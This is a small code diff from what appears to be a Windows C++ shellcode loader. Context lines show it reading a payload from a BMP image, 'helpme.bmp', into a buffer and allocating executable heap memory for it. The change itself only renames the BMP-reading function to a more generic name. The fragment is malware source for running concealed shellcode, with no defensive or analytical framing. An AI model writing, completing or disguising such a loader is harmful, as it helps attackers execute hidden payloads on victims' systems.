@@ -13,7 +13,7 @@ const int shellcode_len = 1544;
 char* payload_data = new char[shellcode_len / 8];
 
 
-void ReadBMP(std::string filename)
+void read_image(std::string filename)
 {
     char header[54];
     int height, width;
@@ -66,7 +66,7 @@ void ReadBMP(std::string filename)
 
 
 int main() {
-    ReadBMP("helpme.bmp");
+    read_image("helpme.bmp");
  
     LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
     LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);
